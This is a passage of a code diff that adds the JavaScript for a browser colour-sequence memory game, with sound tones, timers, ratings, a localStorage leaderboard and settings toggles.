+                document.getElementById('loading-screen').style.display = 'none';
+                document.querySelector('.container-gamememorytest').style.display = 'block';
+            }, 2500);
+
+            // Initialize audio
+            bgMusic = new Audio();
+            bgMusic.loop = true;
+            bgMusic.volume = 0.3;
+        };
+
+        // Language functions
+        function changeLanguage() {
+            const language = document.getElementById('language-select').value;
+            currentLanguage = language;
+            localStorage.setItem('memoryTestLanguage', language);
+            applyLanguage(language);
+        }
+
+        function applyLanguage(lang) {
+            const elements = document.querySelectorAll('[data-lang]');
+            elements.forEach(element => {
+                const key = element.getAttribute('data-lang');
+                if (translations[lang] && translations[lang][key]) {
+                    element.innerHTML = translations[lang][key];
+                }
+            });
+        }
+
+        function getTimeoutDuration() {
+            if (level < 10) return 3000;
+            if (level >= 10 && level < 20) return 2000;
+            if (level >= 20 && level < 35) return 1500;
+            return 1000;
+        }
+
+        function startClickTimeout() {
+            clearTimeout(clickTimeout);
+            clickTimeoutDuration = getTimeoutDuration();
+            
+            clickTimeout = setTimeout(() => {
+                if (gameActive) {
+                    gameOver('timeout');
+                }
+            }, clickTimeoutDuration);
+        }
+
+        function resetClickTimeout() {
+            clearTimeout(clickTimeout);
+            if (gameActive && playerSequence.length < sequence.length) {
+                startClickTimeout();
+            }
+        }
+
+        function startGame() {
+            document.querySelector('.home-screen').style.display = 'none';
+            document.querySelector('.game-screen').style.display = 'block';
+            showCountdown();
+        }
+
+        function showCountdown() {
+            const overlay = document.getElementById('countdown-overlay');
+            const countdownNumber = document.getElementById('countdown-number');
+            overlay.style.display = 'flex';
+            
+            let count = 3;
+            countdownNumber.textContent = count;
+
+            const countdownInterval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownNumber.textContent = count;
+                } else {
+                    countdownNumber.textContent = 'GO!';
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                        initGame();
+                    }, 500);
+                    clearInterval(countdownInterval);
+                }
+            }, 1000);
+        }
+
+        function initGame() {
+            sequence = [];
+            playerSequence = [];
+            level = 0;
+            gameActive = true;
+            startTimer();
+            nextRound();
+        }
+
+        function nextRound() {
+            level++;
+            playerSequence = [];
+            const randomColor = colors[Math.floor(Math.random() * colors.length)];
+            sequence.push(randomColor);
+            document.getElementById('sequence').textContent = level;
+            playSequence();
+        }
+
+        function playSequence() {
+            let i = 0;
+            gameActive = false;
+            clearTimeout(clickTimeout);
+            disableColorBoxes(true);
+            
+            const playNext = () => {
+                if (i < sequence.length) {
+                    setTimeout(() => {
+                        activateColor(sequence[i]);
+                        i++;
+                        playNext();
+                    }, 600);
+                } else {
+                    setTimeout(() => {
+                        gameActive = true;
+                        disableColorBoxes(false);
+                        startClickTimeout();
+                    }, 800);
+                }
+            };
+            
+            playNext();
+        }
+
+        function disableColorBoxes(disabled) {
+            const boxes = document.querySelectorAll('.color-box');
+            boxes.forEach(box => {
+                if (disabled) {
+                    box.classList.add('disabled');
+                } else {
+                    box.classList.remove('disabled');
+                }
+            });
+        }
+
+        function activateColor(color) {
+            const box = document.querySelector(`.color-box.${color}`);
+            box.classList.add('active');
+            playSound(color);
+            
+            setTimeout(() => {
+                box.classList.remove('active');
+            }, 400);
+        }
+
+        function playSound(color) {
+            const frequencies = {
+                red: 261.63,
+                yellow: 329.63,
+                green: 392.00,
+                blue: 523.25
+            };
+
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+
+            oscillator.frequency.value = frequencies[color];
+            oscillator.type = 'sine';
+
+            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.3);
+        }
+
+        function playerClick(color) {
+            if (!gameActive) return;
+
+            resetClickTimeout();
+            activateColor(color);
+            playerSequence.push(color);
+
+            const currentIndex = playerSequence.length - 1;
+            
+            if (playerSequence[currentIndex] !== sequence[currentIndex]) {
+                gameOver('wrong');
+                return;
+            }
+
+            if (playerSequence.length === sequence.length) {
+                clearTimeout(clickTimeout);
+                if (level >= 1000) {
+                    gameOver('complete');
+                } else {
+                    gameActive = false;
+                    setTimeout(nextRound, 1000);
+                }
+            }
+        }
+
+        function startTimer() {
+            startTime = Date.now();
+            timerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const minutes = Math.floor(elapsed / 60).toString().padStart(2, '0');
+                const seconds = (elapsed % 60).toString().padStart(2, '0');
+                document.getElementById('timer').textContent = `${minutes}:${seconds}`;
+            }, 1000);
+        }
+
+        function gameOver(reason) {
+            gameActive = false;
+            clearInterval(timerInterval);
+            clearTimeout(clickTimeout);
+            
+            const finalTime = document.getElementById('timer').textContent;
+            const finalScore = level;
+
+            saveToLeaderboard(finalScore, finalTime);
+
+            document.querySelector('.game-screen').style.display = 'none';
+            document.querySelector('.game-over-screen').style.display = 'block';
+            document.getElementById('final-score').textContent = finalScore;
+            document.getElementById('final-time').textContent = finalTime;
+            
+            const rating = getRating(finalScore);
+            document.getElementById('rating').textContent = rating;
+        }
+
+        function getRating(score) {
+            if (score < 10) return '😅 Stupid';
+            if (score >= 10 && score < 20) return '👍 Normal';
+            if (score >= 20 && score < 35) return '🧠 Clever';
+            if (score >= 35 && score < 100) return '🎓 Big Brain';
+            return '🏆 You Good!';
+        }
+
+        function saveToLeaderboard(score, time) {
+            leaderboard.push({ score, time, date: new Date().toLocaleDateString() });
+            leaderboard.sort((a, b) => {
+                if (b.score !== a.score) return b.score - a.score;
+                return a.time.localeCompare(b.time);
+            });
+            leaderboard = leaderboard.slice(0, 12);
+            
+            try {
+                localStorage.setItem('memoryTestLeaderboard', JSON.stringify(leaderboard));
+            } catch (e) {
+                console.log('LocalStorage not available');
+            }
+            
+            updateLeaderboard();
+        }
+
+        function loadLeaderboard() {
+            try {
+                const saved = localStorage.getItem('memoryTestLeaderboard');
+                if (saved) {
+                    leaderboard = JSON.parse(saved);
+                }
+            } catch (e) {
+                console.log('LocalStorage not available');
+            }
+            updateLeaderboard();
+        }
+
+        function updateLeaderboard() {
+            const list = document.getElementById('leaderboard-list');
+            list.innerHTML = '';
+            
+            if (leaderboard.length === 0) {
+                list.innerHTML = '<div class="leaderboard-item" style="justify-content: center;">No records yet</div>';
+                return;
+            }
+
+            leaderboard.forEach((entry, index) => {
+                const item = document.createElement('div');
+                item.className = 'leaderboard-item';
+                if (index < 3) item.classList.add('top-3');
+                
+                let medal = '';
+                if (index === 0) medal = '🥇';
+                else if (index === 1) medal = '🥈';
+                else if (index === 2) medal = '🥉';
+                
+                item.innerHTML = `
+                    <span><span class="rank">${medal || '#' + (index + 1)}</span> Seq: ${entry.score}</span>
+                    <span><i class="fas fa-clock"></i> ${entry.time}</span>
+                `;
+                list.appendChild(item);
+            });
+        }
+
+        function restartGame() {
+            document.querySelector('.game-over-screen').style.display = 'none';
+            document.querySelector('.game-screen').style.display = 'block';
+            showCountdown();
+        }
+
+        function backToHome() {
+            document.querySelector('.game-over-screen').style.display = 'none';
+            document.querySelector('.game-screen').style.display = 'none';
+            document.querySelector('.home-screen').style.display = 'block';
+            document.querySelector('.container-gamememorytest').style.display = 'block';
+            document.querySelector('.container-aboutmemorytest').style.display = 'none';
+        }
+
+        function showAbout() {
+            document.querySelector('.container-gamememorytest').style.display = 'none';
+            document.querySelector('.container-aboutmemorytest').style.display = 'block';
+        }
+
+        function showSettings() {
+            document.getElementById('settings-modal').style.display = 'flex';
+        }
+
+        function closeSettings() {
+            document.getElementById('settings-modal').style.display = 'none';
+        }
+
+        function toggleTheme() {
+            const body = document.body;
+            const toggle = document.getElementById('theme-toggle');
+            const label = document.getElementById('theme-label');
+            
+            if (toggle.checked) {
+                body.className = 'dark-theme';
+                label.textContent = 'Dark';
+                localStorage.setItem('memoryTestTheme', 'dark');
+            } else {
+                body.className = 'light-theme';
+                label.textContent = 'Light';
+                localStorage.setItem('memoryTestTheme', 'light');
+            }
+        }
+
+        function toggleMusic() {
+            const toggle = document.getElementById('music-toggle');
+            const label = document.getElementById('music-label');
+            
+            if (toggle.checked) {
+                label.textContent = 'On';
+                localStorage.setItem('memoryTestMusic', 'on');
+            } else {
+                label.textContent = 'Off';
+                localStorage.setItem('memoryTestMusic', 'off');
+            }
+        }
+
+        function resetAllData() {
+            if (confirm('Are you sure you want to reset all data? This cannot be undone!')) {
+                try {
+                    localStorage.removeItem('memoryTestLeaderboard');
+                    localStorage.removeItem('memoryTestTheme');
+                    localStorage.removeItem('memoryTestMusic');
+                    localStorage.removeItem('memoryTestLanguage');
+                    
+                    sessionStorage.clear();
+                    
+                    alert('All data has been reset!');
+                    location.reload();
+                } catch (e) {
+                    console.log('Error resetting data:', e);
+                    alert('Failed to reset data!');
+                }
+            }
+        }
+    </script>
+</body>
+</html>
